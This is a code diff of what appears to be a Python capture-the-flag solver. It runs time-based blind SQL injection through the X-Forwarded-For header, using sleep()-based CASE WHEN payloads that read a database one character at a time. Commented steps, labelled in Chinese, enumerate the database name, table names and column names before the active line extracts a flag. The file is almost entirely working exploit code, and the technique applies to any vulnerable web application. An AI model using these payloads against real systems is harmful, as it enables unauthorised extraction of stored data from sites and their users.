@@ -16,16 +16,17 @@ headers = {
 
 for i in range(6):
     for pl in payload:
-        headers['X-Forwarded-For'] = "' +(select case when (substring((select flag from flag) from {} for 1)='{}') then sleep(3) else 0 end) and '1'='1".format(i,pl)
+        #数据库名
+        # headers['X-Forwarded-For'] = "' +(select case when (substring((select database())from {} for 1)='{}') then sleep(5) else 0 end) and '1'='1".format(i,pl)
+        #表名
+        # headers['X-Forwarded-For'] = "' +(select case when (substring((select(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))) from {} for 1)='{}') then sleep(5) else 0 end) and '1'='1".format(i,pl)
+        #字段名
+        # headers['X-Forwarded-For'] = "' +(select case when (substring((select(select(group_concat(column_name))from(information_schema.columns)where(table_name=0x666C6167))) from {} for 1)='{}') then sleep(5) else 0 end) and '1'='1".format(i,pl)
+        #拿flag
+        headers['X-Forwarded-For'] = "' +(select case when (substring((select flag from clien) from {} for 1)='{}') then sleep(5) else 0 end) and '1'='1".format(i,pl)
         try:
-            requests.get(url, headers=headers, timeout=2)
+            requests.get(url, headers=headers, timeout=4)
         except:
             flag += pl
             print(flag)
             break
-
-
-# "X-Forwarded-For":"' +(select case when (substring((select database())from %s for 1)='%s') then sleep(5) else 0 end) and 'Zkkp'='Zkkp" % (j,i)  #跑数据库的名字
-# #"X-Forwarded-For":"' +(select case when (substring((select(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))) from %s for 1)='%s') then sleep(5) else 0 end) and 'Zkkp'='Zkkp" % (j,i)  #跑表明
-# #"X-Forwarded-For":"' +(select case when (substring((select(select(group_concat(column_name))from(information_schema.columns)where(table_name=0x666C6167))) from %s for 1)='%s') then sleep(5) else 0 end) and 'Zkkp'='Zkkp" % (j,i) #跑字段名
-#"X-Forwarded-For":"' +(select case when (substring((select flag from flag) from %s for 1)='%s') then sleep(5) else 0 end) and 'Zkkp'='Zkkp" % (j,i)  #跑记录
